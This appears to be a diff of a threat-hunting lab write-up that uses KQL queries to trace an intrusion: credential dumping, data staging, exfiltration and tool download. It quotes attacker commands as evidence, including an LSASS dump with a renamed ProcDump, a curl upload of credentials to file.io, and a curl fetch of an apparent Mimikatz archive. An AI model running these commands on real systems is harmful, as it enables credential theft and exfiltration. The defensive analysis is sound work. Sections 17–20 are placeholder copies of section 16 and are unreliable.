@@ -259,80 +259,155 @@ DeviceFileEvents
 
 ### 13. Collection: Data Staging Directory 
 
-Searched for evidence of a data staging directory and discovered that...
-
-credential dumping activities and discovered that ProcDump (renamed to pd.exe) was used to dump LSASS process memory using the command: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp. LSASS memory contains credentials for logged-on users, enabling the attacker to extract plaintext and hashed passwords for privilege escalation and lateral movement.
-
-**Query used to locate events:**
-
-```kql
-DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where DeviceName == "azuki-fileserver01"
-| where FileName == "pd.exe" or ProcessCommandLine has "pd.exe"
-| project TimeGenerated, DeviceName, ProcessCommandLine
-| order by TimeGenerated asc
-
-```
-<img width="1940" height="293" alt="CH_Q15" src="https://github.com/user-attachments/assets/f4dc6421-1080-4885-99dc-04814ddbb47a" />
-
----
-
-### 14. Exfiltration: Upload & Cloud Service
-
-Searched for evidence of data exfiltration and discovered that the attacker used curl with form-based transfer syntax (i.e., -F: Form-based file upload; multipart/form-data HTTP POST) to upload the compressed credential archive to a temporary file hosting service (i.e., file.io) using the command: curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. File.io is a temporary file hosting service that requires no authentication, automatically deletes files after download, leaves minimal traces for forensic investigation, blends with legitimate file sharing traffic, and provides anonymous upload capability.
-
-**Query used to locate events:**
-
-```kql
-DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where DeviceName == "azuki-fileserver01"
-| where FileName == "curl.exe"
-| project TimeGenerated, ProcessCommandLine
-| order by TimeGenerated asc
-
-```
-<img width="1776" height="595" alt="CH_Q16" src="https://github.com/user-attachments/assets/6740b98d-1933-40ec-8173-485f0e3991f5" />
-
----
-
-### 15. Persistence: Registry Value Name & Beacon Filename
-
-Searched for evidence of persistence and discovered the creation of a registry Run key with a value name designed to appear as legitimate software (i.e., FileShareSync). This registry value name was likely chosen to appear as legitimate file synchronization software (i.e., a service that would be expected on a file server). The persistence mechanism launches a hidden PowerShell script on every system startup, ensuring the attacker maintains access even after system reboots or credential changes. In addition, the beacon script (i.e., svchost.ps1) was named after the legitimate Windows Service Host (svchost.exe) process in order to make the file appear legitimate in directory listings, reduce suspicion if discovered during casual system inspection, or blend with legitimate Windows processes in monitoring tools. The PowerShell script serves as a persistence beacon, likely establishing command-and-control connectivity or executing additional payloads on system startup.
-
-**Query used to locate events:**
-
-```kql
-DeviceRegistryEvents
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where DeviceName == "azuki-fileserver01"
-| where RegistryKey has "Run"
-| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
-| order by TimeGenerated asc
-
-```
-<img width="2468" height="338" alt="CH_Q18" src="https://github.com/user-attachments/assets/217c2811-c18a-4e62-9c05-f9ff8fb79bc6" />
-
----
-
-### 16. Anti-Forensics: History File Deletion
-
-Searched for anti-forensics activities and discovered the deletion of the PowerShell command history file (i.e., ConsoleHost_history.txt). This file logs all interactive PowerShell commands across sessions and is commonly targeted by attackers to remove evidence of their activities. The deletion occurred after the completion of data exfiltration and persistence establishment, indicating a deliberate attempt to cover tracks.
+Searched for evidence of a data staging directory and discovered that the attacker staged the stolen data archives in C:\ProgramData\Microsoft\Crypto\staging. The staging directory mimics the legitimate Microsoft cryptographic service directory to avoid suspicion during incident response and was used to organize five archives of stolen business data.
 
 **Query used to locate events:**
 
 ```kql
 DeviceFileEvents
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where DeviceName == "azuki-fileserver01"
-| where ActionType == "FileDeleted"
-| where FileName has "history"
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where FileName endswith ".tar.gz"
 | project TimeGenerated, FileName, FolderPath, ActionType
 | order by TimeGenerated asc
 
 ```
-<img width="2667" height="282" alt="CH_Q20B" src="https://github.com/user-attachments/assets/2f6b774f-3802-4b6d-a66b-1bfbdec660be" />
+<img width="2298" height="672" alt="BT_Q17" src="https://github.com/user-attachments/assets/929288ff-8dd1-4a05-ae86-f3ed08b27e73" />
+
+---
+
+### 14. Collection: Automated Data Collection 
+
+Searched for evidence of bulk data theft operations and discovered that the attacker utilized the following robocopy command with retry logic and network optimization flags to copy the CEO's banking documents to a hidden staging directory: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP.
+
+
+**Query used to locate events:**
+
+```kql
+DeviceProcessEvents
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where FileName in~ ("robocopy.exe", "xcopy.exe", "copy.exe") 
+| project TimeGenerated, FileName, ProcessCommandLine
+| order by TimeGenerated asc
+
+```
+<img width="2662" height="460" alt="BT_Q18" src="https://github.com/user-attachments/assets/a3422e13-0fdc-4681-af5d-bb60846ee254" />
+
+---
+
+### 15. Collection: Exfiltration Volume
+
+Searched for archive file creation events in the staging directory to identify the volume of data prepared for exfiltration and discovered that the attacker created eight distinct archives, representing comprehensive data collection across financial records, credentials, business contracts, and authentication databases. 
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where FileName has_any (".zip", ".7z", ".rar", ".tar", ".gz")
+| where FolderPath has "C:\\ProgramData\\Microsoft\\Crypto\\staging"  
+| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessFileName
+| order by TimeGenerated asc
+
+```
+<img width="2456" height="837" alt="BT_Q19" src="https://github.com/user-attachments/assets/8ee5ecde-2222-42c2-947d-14f1c4ab5347" />
+
+---
+
+### 16. Credential Access: Credential Theft Tool Download
+
+Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+
+**Query used to locate events:**
+
+```kql
+DeviceProcessEvents
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+
+```
+<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+
+---
+
+### 17. XXXX
+
+Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+
+**Query used to locate events:**
+
+```kql
+DeviceProcessEvents
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+
+```
+<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+
+---
+
+### 18. XXXXX
+
+Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+
+**Query used to locate events:**
+
+```kql
+DeviceProcessEvents
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+
+```
+<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+
+---
+
+### 19. XXXXXX
+
+Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+
+**Query used to locate events:**
+
+```kql
+DeviceProcessEvents
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+
+```
+<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+
+---
+
+### 20. XXXXX
+
+Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+
+**Query used to locate events:**
+
+```kql
+DeviceProcessEvents
+| where TimeGenerated >= datetime(2025-11-19)
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+
+```
+<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
 
 ---
 
